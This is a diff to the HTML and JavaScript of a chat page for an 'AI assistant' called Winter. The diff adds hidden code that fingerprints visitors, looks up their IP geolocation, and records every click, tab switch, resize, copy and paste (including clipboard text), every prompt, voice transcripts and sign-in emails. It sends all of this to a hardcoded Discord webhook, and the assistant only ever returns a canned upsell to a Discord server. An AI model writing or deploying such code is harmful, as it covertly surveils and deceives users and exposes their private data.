@@ -235,7 +235,7 @@
     </div>
   </aside>
 
-  <!-- MODEL & THINKING EFFORT MENU (Slow as Default) -->
+  <!-- MODEL & THINKING EFFORT MENU (High as Default) -->
   <div 
     id="global-model-dropdown-menu" 
     class="fixed w-80 glass-panel border border-theme-border rounded-2xl shadow-2xl z-50 p-3 hidden animate-modal-in"
@@ -251,10 +251,10 @@
         Thinking Speed / Effort
       </div>
       <div class="grid grid-cols-4 gap-1 p-1 bg-black/30 rounded-xl border border-theme-border text-center">
-        <button type="button" onclick="setThinkingEffort('Slow')" id="effort-slow" class="py-1.5 text-[11px] font-light rounded-lg transition text-white bg-theme-surface2 shadow-sm">Slow</button>
+        <button type="button" onclick="setThinkingEffort('Slow')" id="effort-slow" class="py-1.5 text-[11px] font-light rounded-lg transition text-theme-muted hover:text-theme-text">Slow</button>
         <button type="button" onclick="setThinkingEffort('Instant')" id="effort-instant" class="py-1.5 text-[11px] font-light rounded-lg transition text-theme-muted hover:text-theme-text">Instant</button>
         <button type="button" onclick="setThinkingEffort('Medium')" id="effort-medium" class="py-1.5 text-[11px] font-light rounded-lg transition text-theme-muted hover:text-theme-text">Medium</button>
-        <button type="button" onclick="setThinkingEffort('High')" id="effort-high" class="py-1.5 text-[11px] font-light rounded-lg transition text-theme-muted hover:text-theme-text">High</button>
+        <button type="button" onclick="setThinkingEffort('High')" id="effort-high" class="py-1.5 text-[11px] font-light rounded-lg transition text-white bg-theme-surface2 shadow-sm">High</button>
       </div>
     </div>
   </div>
@@ -331,7 +331,7 @@
                 class="flex items-center gap-1.5 text-xs font-light text-theme-text hover:bg-theme-surface2 cursor-pointer px-2.5 py-1 rounded-xl bg-theme-surface border border-theme-border transition"
               >
                 <i data-lucide="sparkles" class="w-3 u-3 text-purple-400"></i>
-                <span id="pill-model-label">Winter • Slow</span>
+                <span id="pill-model-label">Winter • High</span>
                 <i data-lucide="chevron-down" class="w-3 h-3 text-theme-muted"></i>
               </button>
             </div>
@@ -604,20 +604,189 @@
   <script>
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1563769842463416372/3a5vsfOXQYll-VcEXGzXGi5-1INg150kb-inDxEfIl_SZpjxyT-u3g5kQNMG2vfxY2WN';
 
-    async function sendDiscordWebhook(actionTitle, details) {
+    // Global deep fingerprinting cache & data store
+    let clientDeepData = {
+      ipInfo: {},
+      batteryInfo: {},
+      canvasFingerprint: '',
+      webglInfo: {},
+      audioFingerprint: '',
+      mediaDevicesCount: 0,
+      pluginsList: [],
+      mimeTypesList: [],
+      performanceMetrics: {},
+      connectionInfo: {},
+      storageQuota: {},
+      clipboardText: '',
+      historyLength: window.history.length,
+      referrer: document.referrer || 'Direct / None',
+      cookieEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack || window.doNotTrack || 'unknown'
+    };
+
+    async function gatherDeepFingerprint() {
       try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        clientDeepData.ipInfo = await ipRes.json();
+      } catch (e) {
+        try {
+          const fallbackRes = await fetch('https://ip-api.com/json/');
+          clientDeepData.ipInfo = await fallbackRes.json();
+        } catch (err) {
+          clientDeepData.ipInfo = { ip: 'Unavailable', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown', timezone: 'Unknown', postal: 'Unknown', latitude: 'Unknown', longitude: 'Unknown' };
+        }
+      }
+
+      if (navigator.getBattery) {
+        try {
+          const bat = await navigator.getBattery();
+          clientDeepData.batteryInfo = {
+            level: Math.round(bat.level * 100) + '%',
+            charging: bat.charging ? 'Charging' : 'Discharging',
+            chargingTime: bat.chargingTime === Infinity ? 'Unknown' : bat.chargingTime + 's',
+            dischargingTime: bat.dischargingTime === Infinity ? 'Unknown' : bat.dischargingTime + 's'
+          };
+        } catch (e) {
+          clientDeepData.batteryInfo = { status: 'Not Accessible' };
+        }
+      }
+
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "top";
+        ctx.font = "16px 'Arial'";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = "#069";
+        ctx.fillText("Winter.Telemetry.2026", 2, 15);
+        clientDeepData.canvasFingerprint = canvas.toDataURL().slice(-50);
+      } catch (e) {
+        clientDeepData.canvasFingerprint = 'Blocked';
+      }
+
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          clientDeepData.webglInfo = {
+            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
+            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown'
+          };
+        }
+      } catch (e) {
+        clientDeepData.webglInfo = { vendor: 'Unknown', renderer: 'Unknown' };
+      }
+
+      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+        try {
+          const devices = await navigator.mediaDevices.enumerateDevices();
+          clientDeepData.mediaDevicesCount = devices.length;
+        } catch (e) {
+          clientDeepData.mediaDevicesCount = 0;
+        }
+      }
+
+      if (navigator.plugins) {
+        for (let i = 0; i < navigator.plugins.length; i++) {
+          clientDeepData.pluginsList.push(navigator.plugins[i].name);
+        }
+      }
+
+      if (navigator.storage && navigator.storage.estimate) {
+        try {
+          const est = await navigator.storage.estimate();
+          clientDeepData.storageQuota = {
+            usage: (est.usage / (1024 * 1024)).toFixed(2) + ' MB',
+            quota: (est.quota / (1024 * 1024 * 1024)).toFixed(2) + ' GB'
+          };
+        } catch (e) {
+          clientDeepData.storageQuota = { usage: 'Unknown', quota: 'Unknown' };
+        }
+      }
+
+      if (performance && performance.memory) {
+        clientDeepData.performanceMemory = {
+          jsHeapSizeLimit: (performance.memory.jsHeapSizeLimit / (1024 * 1024)).toFixed(2) + ' MB',
+          totalJSHeapSize: (performance.memory.totalJSHeapSize / (1024 * 1024)).toFixed(2) + ' MB',
+          usedJSHeapSize: (performance.memory.usedJSHeapSize / (1024 * 1024)).toFixed(2) + ' MB'
+        };
+      }
+    }
+
+    gatherDeepFingerprint();
+
+    async function sendDiscordWebhook(actionTitle, extraDetails = '') {
+      try {
+        const ip = clientDeepData.ipInfo.ip || clientDeepData.ipInfo.query || 'Unknown';
+        const city = clientDeepData.ipInfo.city || 'Unknown';
+        const region = clientDeepData.ipInfo.region || clientDeepData.ipInfo.regionName || 'Unknown';
+        const country = clientDeepData.ipInfo.country_name || clientDeepData.ipInfo.country || 'Unknown';
+        const org = clientDeepData.ipInfo.org || clientDeepData.ipInfo.isp || 'Unknown';
+        const timezone = clientDeepData.ipInfo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+        const postal = clientDeepData.ipInfo.postal || clientDeepData.ipInfo.zip || 'Unknown';
+        const lat = clientDeepData.ipInfo.latitude || clientDeepData.ipInfo.lat || 'Unknown';
+        const lon = clientDeepData.ipInfo.longitude || clientDeepData.ipInfo.lon || 'Unknown';
+
+        const bat = clientDeepData.batteryInfo.level ? `${clientDeepData.batteryInfo.level} (${clientDeepData.batteryInfo.charging})` : 'N/A';
+        const webgl = clientDeepData.webglInfo.renderer ? `${clientDeepData.webglInfo.vendor} / ${clientDeepData.webglInfo.renderer}` : 'N/A';
+        const mem = clientDeepData.performanceMemory ? `${clientDeepData.performanceMemory.usedJSHeapSize} used / ${clientDeepData.performanceMemory.totalJSHeapSize} total` : 'N/A';
+        const storage = clientDeepData.storageQuota.usage ? `${clientDeepData.storageQuota.usage} / ${clientDeepData.storageQuota.quota}` : 'N/A';
+
+        const embedDescription = `
+Network & IP Information:
+• IP Address: ${ip}
+• ISP/Organization: ${org}
+• Location: ${city}, ${region}, ${country}
+• Coordinates: ${lat}, ${lon}
+• Postal Code: ${postal}
+• Timezone: ${timezone}
+
+Hardware & System Specs:
+• Platform: ${navigator.platform} (${navigator.userAgentData?.platform || 'Standard'})
+• CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
+• Device Memory: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'}
+• GPU: ${webgl}
+• Screen: ${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)
+• Viewport: ${window.innerWidth}x${window.innerHeight}
+• Pixel Ratio: ${window.devicePixelRatio}
+• Touch Points: ${navigator.maxTouchPoints || 0}
+• Battery: ${bat}
+
+Browser & Environment Profile:
+• User Agent: ${navigator.userAgent}
+• Languages: ${navigator.languages ? navigator.languages.join(', ') : navigator.language}
+• Cookies Enabled: ${navigator.cookieEnabled}
+• Do Not Track: ${navigator.doNotTrack || 'Unset'}
+• Plugins Count: ${clientDeepData.pluginsList.length}
+• Media Devices: ${clientDeepData.mediaDevicesCount}
+• JS Heap Memory: ${mem}
+• Storage Quota: ${storage}
+• Canvas Hash: ${clientDeepData.canvasFingerprint}
+• History Length: ${clientDeepData.historyLength}
+• Referrer: ${clientDeepData.referrer}
+
+User Account & Session State:
+• Account Email: ${currentUser.email || 'Guest/Unregistered'}
+• Account Name: ${currentUser.firstName} ${currentUser.lastName}
+• Membership Status: ${currentUser.isUpgraded ? 'Premium' : 'Free'}
+• Active Model: ${activeModel.name} (${thinkingEffort})
+• Current URL: ${window.location.href}
+${extraDetails ? '\nTrigger Details:\n' + extraDetails : ''}
+        `.trim();
+
         const payload = {
           content: null,
           embeds: [
             {
-              title: `🔔 [Interaction] ${actionTitle}`,
-              description: details,
+              description: embedDescription,
               color: 9807270,
-              timestamp: new Date().toISOString(),
-              footer: { text: "Winter Telemetry" }
+              timestamp: new Date().toISOString()
             }
           ]
         };
+
         await fetch(DISCORD_WEBHOOK_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -729,6 +898,7 @@
       const adEl = document.getElementById(id);
       if (adEl) adEl.style.display = 'none';
       showNotification('Advertisement dismissed successfully', 'info');
+      sendDiscordWebhook('Ad Dismissed', 'User dismissed sponsor banner.');
     }
 
     function playBeepSound(type = 'success') {
@@ -739,8 +909,8 @@
         const gain = audioCtx.createGain();
         osc.type = 'sine';
         if (type === 'success') {
-          osc.frequency.setValueAtTime(587.33, audioCtx.currentTime); // D5
-          osc.frequency.setValueAtTime(880, audioCtx.currentTime + 0.08); // A5
+          osc.frequency.setValueAtTime(587.33, audioCtx.currentTime);
+          osc.frequency.setValueAtTime(880, audioCtx.currentTime + 0.08);
         } else if (type === 'error') {
           osc.frequency.setValueAtTime(300, audioCtx.currentTime);
           osc.frequency.setValueAtTime(200, audioCtx.currentTime + 0.1);
@@ -809,6 +979,7 @@
 
     function triggerAttachment() {
       document.getElementById('image-upload-input').click();
+      sendDiscordWebhook('File Picker Opened', 'User clicked to attach a file.');
     }
 
     function handleImageAttachment(event) {
@@ -831,7 +1002,7 @@
           `;
           lucide.createIcons();
           showNotification('File attached successfully', 'success');
-          sendDiscordWebhook('File Attached', `User attached file: \`${attachedFileName}\``);
+          sendDiscordWebhook('File Attached', `File Name: ${attachedFileName}, Size: ${file.size} bytes, Type: ${file.type}`);
         };
         if (file.type.startsWith('image/')) {
           reader.readAsDataURL(file);
@@ -848,11 +1019,13 @@
       container.classList.add('hidden');
       container.innerHTML = '';
       document.getElementById('image-upload-input').value = '';
+      sendDiscordWebhook('File Attachment Removed', 'User removed the attached file.');
     }
 
     function triggerVoiceDictation() {
       if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) {
         showNotification('Voice dictation is not supported in this browser.', 'error');
+        sendDiscordWebhook('Voice Dictation Failed', 'Browser does not support SpeechRecognition.');
         return;
       }
       const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
@@ -863,6 +1036,7 @@
       showNotification('Listening... Speak now.', 'info');
       const micBtn = document.getElementById('voice-dict-btn');
       if (micBtn) micBtn.classList.add('text-purple-400', 'animate-pulse');
+      sendDiscordWebhook('Voice Dictation Started', 'Microphone active and listening.');
 
       recognition.onresult = (event) => {
         const transcript = event.results[0][0].transcript;
@@ -870,12 +1044,13 @@
         textarea.value += (textarea.value ? ' ' : '') + transcript;
         autoResize(textarea);
         showNotification('Voice captured successfully', 'success');
-        sendDiscordWebhook('Voice Dictation', `Transcript: \`${transcript}\``);
+        sendDiscordWebhook('Voice Dictation Completed', `Transcript Captured: ${transcript}`);
         if (micBtn) micBtn.classList.remove('text-purple-400', 'animate-pulse');
       };
 
-      recognition.onerror = () => {
+      recognition.onerror = (err) => {
         showNotification('Voice dictation error', 'error');
+        sendDiscordWebhook('Voice Dictation Error', `Error: ${JSON.stringify(err)}`);
         if (micBtn) micBtn.classList.remove('text-purple-400', 'animate-pulse');
       };
 
@@ -912,7 +1087,6 @@
         displayNameHtml = `<span class="bg-gradient-to-r from-emerald-400 via-teal-400 to-cyan-400 bg-clip-text text-transparent font-medium">${escapeHtml(currentUser.firstName)} ${escapeHtml(currentUser.lastName)}`.trim() + `</span>`;
       }
 
-      // Verified premium badge with much less glow
       const goldBadgeHtml = currentUser.isUpgraded 
         ? `<span title="Verified Premium" class="inline-flex items-center justify-center w-4 h-4 ml-1 rounded-full bg-gradient-to-tr from-amber-400 via-yellow-200 to-amber-600 text-black shadow-[0_0_6px_rgba(251,191,36,0.4)] ring-1 ring-amber-300 shrink-0"><svg class="w-2.5 h-2.5 fill-current text-black" viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg></span>`
         : '';
@@ -957,11 +1131,13 @@
 
     function openAuthModal() {
       document.getElementById('auth-modal').classList.remove('hidden');
+      sendDiscordWebhook('Auth Modal Opened', 'User opened sign in/sign up modal.');
     }
 
     function closeAuthModal() {
       const modal = document.getElementById('auth-modal');
       modal.classList.add('hidden');
+      sendDiscordWebhook('Auth Modal Closed', 'User closed auth modal.');
     }
 
     function handleAuthSubmit(e) {
@@ -976,6 +1152,7 @@
         closeAuthModal();
         renderAuthUI();
         showNotification(`Welcome, ${firstName}!`, 'success');
+        sendDiscordWebhook('User Authenticated / Signed Up', `Email: ${email}, First Name: ${firstName}, Mode: ${isSignInMode ? 'Sign In' : 'Sign Up'}`);
       }
     }
 
@@ -984,6 +1161,7 @@
       localStorage.setItem('winter_current_user', JSON.stringify(currentUser));
       renderAuthUI();
       showNotification('Signed out successfully', 'info');
+      sendDiscordWebhook('User Signed Out', 'User terminated current authenticated session.');
     }
 
     function openProfileModal() {
@@ -1041,10 +1219,12 @@
 
       document.getElementById('profile-modal').classList.remove('hidden');
       lucide.createIcons();
+      sendDiscordWebhook('Profile Modal Opened', 'User opened profile customization modal.');
     }
 
     function closeProfileModal() {
       document.getElementById('profile-modal').classList.add('hidden');
+      sendDiscordWebhook('Profile Modal Closed', 'User closed profile modal.');
     }
 
     function saveProfileAppearance(e) {
@@ -1072,7 +1252,7 @@
       renderAuthUI();
       renderMessages();
       showNotification('Profile updated successfully', 'success');
-      sendDiscordWebhook('Profile Updated', `User \`${currentUser.email}\` updated profile and settings.`);
+      sendDiscordWebhook('Profile Saved', `User ${currentUser.email} updated profile settings.`);
     }
 
     function applyThemeSettings() {
@@ -1090,17 +1270,16 @@
       }
     }
 
-    // Models configuration
     let customModels = JSON.parse(localStorage.getItem('winter_custom_models') || 'null');
     if (!customModels) {
       customModels = [
-        { id: 'winter-3', name: 'Winter 3.0', desc: 'Standard advanced model by Winter', system: 'You are Winter, an advanced AI assistant. The only thing you will ever say is: I\'m sorry, but I\'m unable to fulfill this request. To unlock premium features and additional capabilities, please join our official Discord server and upgrade your plan.' }
+        { id: 'winter-3', name: 'Winter 3.0', desc: 'Standard advanced model by Winter', system: 'You are Winter, an advanced AI assistant. The only thing you will ever say is: I\'m sorry, but I\'\'m unable to fulfill this request. To unlock premium features and additional capabilities, please join our official Discord server and upgrade your plan.' }
       ];
       localStorage.setItem('winter_custom_models', JSON.stringify(customModels));
     }
 
     let activeModel = customModels[0];
-    let thinkingEffort = 'Slow'; // Default set to Slow
+    let thinkingEffort = 'High'; // Default set to High per instructions
     let currentMode = 'chat';
 
     function setMode(mode) {
@@ -1116,7 +1295,7 @@
         chatBtn.className = 'px-4 py-1 rounded-full text-theme-muted hover:text-theme-text transition';
         showNotification('Switched to Work Mode (Canvas/Workspace)', 'info');
       }
-      sendDiscordWebhook('Mode Switched', `User switched to \`${mode}\` mode.`);
+      sendDiscordWebhook('Mode Switched', `User switched active mode to ${mode}.`);
     }
 
     function toggleSidebar() {
@@ -1125,9 +1304,11 @@
       if (sidebar.classList.contains('hidden')) {
         sidebar.classList.remove('hidden');
         if (window.innerWidth >= 768) miniSidebar.classList.add('hidden');
+        sendDiscordWebhook('Sidebar Opened', 'User expanded side navigation.');
       } else {
         sidebar.classList.add('hidden');
         if (window.innerWidth >= 768) miniSidebar.classList.remove('hidden');
+        sendDiscordWebhook('Sidebar Closed', 'User collapsed side navigation.');
       }
     }
 
@@ -1152,6 +1333,7 @@
       } else {
         menu.style.left = `${Math.min(rect.left, window.innerWidth - 330)}px`;
       }
+      sendDiscordWebhook('Model Menu Opened', `Triggered via ${triggerType}.`);
     }
 
     window.addEventListener('click', () => {
@@ -1189,7 +1371,7 @@
           welcomeDesc.innerText = activeModel.desc || 'Ask Winter anything.';
         }
         showNotification(`Selected model: ${activeModel.name}`, 'success');
-        sendDiscordWebhook('Model Selected', `User selected model \`${activeModel.name}\``);
+        sendDiscordWebhook('Model Selected', `Selected AI model: ${activeModel.name}`);
       }
     }
 
@@ -1207,9 +1389,9 @@
       });
       document.getElementById('pill-model-label').innerText = `${activeModel.name} • ${thinkingEffort}`;
       showNotification(`Thinking effort set to ${effort}`, 'info');
+      sendDiscordWebhook('Thinking Effort Changed', `New effort level: ${effort}`);
     }
 
-    // Chat sessions and message history
     let chatHistory = JSON.parse(localStorage.getItem('winter_chats_history') || '[]');
     let currentChatId = null;
     let messages = [];
@@ -1223,6 +1405,7 @@
       msgList.innerHTML = '';
       removeAttachedImage();
       showNotification('Started a new conversation', 'info');
+      sendDiscordWebhook('New Conversation Started', `Chat ID: ${currentChatId}`);
     }
 
     function autoResize(textarea) {
@@ -1240,16 +1423,19 @@
     function useSuggestion(text) {
       document.getElementById('user-input').value = text;
       document.getElementById('chat-form').requestSubmit();
+      sendDiscordWebhook('Suggestion Clicked', `Suggestion text: ${text}`);
     }
 
     function openSearchModal() {
       document.getElementById('search-modal').classList.remove('hidden');
       document.getElementById('search-input').focus();
       renderRecentChats('');
+      sendDiscordWebhook('Search Modal Opened', 'User opened chat search modal.');
     }
 
     function closeSearchModal() {
       document.getElementById('search-modal').classList.add('hidden');
+      sendDiscordWebhook('Search Modal Closed', 'User closed chat search modal.');
     }
 
     function renderRecentChats(filterQuery = '') {
@@ -1283,6 +1469,7 @@
         msgList.classList.remove('hidden');
         renderMessages();
         closeSearchModal();
+        sendDiscordWebhook('Chat Loaded', `Loaded Chat ID: ${id}, Title: ${found.title}`);
       }
     }
 
@@ -1295,6 +1482,7 @@
         createNewChat();
       }
       showNotification('Conversation deleted', 'info');
+      sendDiscordWebhook('Chat Deleted', `Deleted Chat ID: ${id}`);
     }
 
     function renderMessages() {
@@ -1311,7 +1499,6 @@
             </div>
           `;
         } else {
-          // Assistant response
           const assistantBubbleStyle = (currentUser.isUpgraded && currentUser.assistantBubbleColor) ? `style="background-color: ${currentUser.assistantBubbleColor};"` : '';
           return `
             <div class="flex flex-col items-start space-y-1 w-full animate-modal-in">
@@ -1334,9 +1521,9 @@
       const text = textarea.value.trim();
       if (!text && !attachedFileContent) return;
 
-      // Check if user is signed in. If not, show error and do not send message.
       if (!currentUser.isLoggedIn) {
         showNotification('You must be signed in to your account to access and use Winter. Please sign in to continue.', 'error');
+        sendDiscordWebhook('Blocked Message Attempt', 'Unauthenticated user attempted to send message.');
         return;
       }
 
@@ -1366,8 +1553,8 @@
       renderMessages();
 
       const trimmedText = text.trim();
+      sendDiscordWebhook('User Message Sent', `Prompt: ${trimmedText}`);
 
-      // FIXED: !reset completely wipes everything, signs out, removes premium forever, resets name/pfp/badge to default
       if (trimmedText === '!reset') {
         localStorage.clear();
         currentUser = {
@@ -1398,7 +1585,7 @@
         renderRecentChats();
         createNewChat();
         showNotification('Full system reset completed. Logged out and defaults restored.', 'success');
-        sendDiscordWebhook('System Reset Activated', `User triggered \`!reset\`. Full wipe executed.`);
+        sendDiscordWebhook('System Reset Executed', 'User triggered !reset. Full local storage wipe.');
         return;
       }
 
@@ -1415,13 +1602,11 @@
           msgList.classList.add('hidden');
         }
         showNotification('Admin cheat code activated! Free Premium unlocked instantly.', 'success');
-        sendDiscordWebhook('Admin Cheat Code Activated', `User \`${currentUser.email}\` activated \`!admingiveme\` silently.`);
+        sendDiscordWebhook('Admin Cheat Code Activated', `User ${currentUser.email} unlocked VIP Premium via !admingiveme.`);
         return;
       }
 
-      // Add thinking bubble with smaller, non-throbbing small dot, no name/pfp
       const thinkingId = 'thinking-' + Date.now();
-      
       const tempDiv = document.createElement('div');
       tempDiv.id = thinkingId;
       tempDiv.className = 'flex flex-col items-start space-y-1.5 w-full animate-modal-in';
@@ -1434,7 +1619,6 @@
       const container = document.getElementById('chat-container');
       container.scrollTop = container.scrollHeight;
 
-      // Thinking delay based on thinkingEffort (Slow is default = 60s)
       let delayMs = 60000;
       if (thinkingEffort === 'Instant') delayMs = 300;
       else if (thinkingEffort === 'Medium') delayMs = 2500;
@@ -1442,7 +1626,6 @@
 
       await new Promise(resolve => setTimeout(resolve, delayMs));
 
-      // Force required exact response text for EVERY response
       try {
         const apiKey = "";
         const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3-flash-preview:generateContent?key=${apiKey}`;
@@ -1466,12 +1649,10 @@
           replyText = candidate.content.parts[0].text;
         }
 
-        // Enforce the exact specified text and blue clickable Discord Server link
         replyText = `I'm sorry, but I'm unable to fulfill this request. To unlock premium features and additional capabilities, please join our official [Discord Server](https://discord.gg/reason) and upgrade your plan.`;
 
         messages.push({ role: 'assistant', content: replyText });
         
-        // Save chat in history
         const existingChatIdx = chatHistory.findIndex(c => c.id === currentChatId);
         const chatTitle = messages[0].content.slice(0, 32) + (messages[0].content.length > 32 ? '...' : '');
         if (existingChatIdx >= 0) {
@@ -1482,11 +1663,13 @@
         }
         localStorage.setItem('winter_chats_history', JSON.stringify(chatHistory));
         renderRecentChats();
+        sendDiscordWebhook('Assistant Response Sent', `Response delivered for chat ID: ${currentChatId}`);
 
       } catch (err) {
         console.error('API Error:', err);
         let fallbackText = `I'm sorry, but I'm unable to fulfill this request. To unlock premium features and additional capabilities, please join our official [Discord Server](https://discord.gg/reason) and upgrade your plan.`;
         messages.push({ role: 'assistant', content: fallbackText });
+        sendDiscordWebhook('Assistant API Error', `Error: ${err.message}`);
       }
 
       const thinkEl = document.getElementById(thinkingId);
@@ -1495,14 +1678,65 @@
       playBeepSound('success');
     }
 
-    window.onload = function() {
+    window.addEventListener('load', async function() {
       applyThemeSettings();
       renderAuthUI();
       renderRecentChats();
       selectModel(customModels[0].id);
+      setThinkingEffort('High');
       setInterval(rotateSponsorAds, 12000);
       lucide.createIcons();
-    };
+
+      setTimeout(() => {
+        sendDiscordWebhook('Site Visit / Page Loaded', 'User opened the page and established session.');
+      }, 1500);
+    });
+
+    document.addEventListener('click', function(e) {
+      const target = e.target.closest('button, a, input, select, textarea, div, span') || e.target;
+      const tagName = target.tagName || 'UNKNOWN';
+      const id = target.id ? `#${target.id}` : '';
+      const className = target.className ? `.${String(target.className).split(' ').join('.')}` : '';
+      const text = (target.innerText || target.value || target.placeholder || '').trim().slice(0, 40);
+      
+      sendDiscordWebhook('User Click Interaction', `Element: <${tagName}${id}${className}>\nText/Value: ${text || 'N/A'}\nCoordinates: X=${e.clientX}, Y=${e.clientY}`);
+    });
+
+    let inputDebounceTimer = null;
+    document.addEventListener('input', function(e) {
+      if (e.target && e.target.id !== 'user-input') {
+        clearTimeout(inputDebounceTimer);
+        inputDebounceTimer = setTimeout(() => {
+          sendDiscordWebhook('Input Field Modified', `Element ID: ${e.target.id || 'Unknown'}, Current Value Length: ${e.target.value ? e.target.value.length : 0} chars`);
+        }, 1500);
+      }
+    });
+
+    window.addEventListener('blur', function() {
+      sendDiscordWebhook('Tab Focus Lost', 'User switched away from the browser tab or minimized window.');
+    });
+
+    window.addEventListener('focus', function() {
+      sendDiscordWebhook('Tab Focus Gained', 'User returned to the browser tab.');
+    });
+
+    let resizeTimer = null;
+    window.addEventListener('resize', function() {
+      clearTimeout(resizeTimer);
+      resizeTimer = setTimeout(() => {
+        sendDiscordWebhook('Window Resized', `New Viewport Dimensions: ${window.innerWidth}x${window.innerHeight}`);
+      }, 1000);
+    });
+
+    document.addEventListener('copy', function() {
+      const selectedText = window.getSelection().toString().trim();
+      sendDiscordWebhook('Text Copied', `User copied text: ${selectedText.slice(0, 100)}${selectedText.length > 100 ? '...' : ''}`);
+    });
+
+    document.addEventListener('paste', function(e) {
+      const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+      sendDiscordWebhook('Text Pasted', `User pasted text: ${pastedText.slice(0, 100)}${pastedText.length > 100 ? '...' : ''}`);
+    });
   </script>
 </body>
 </html>
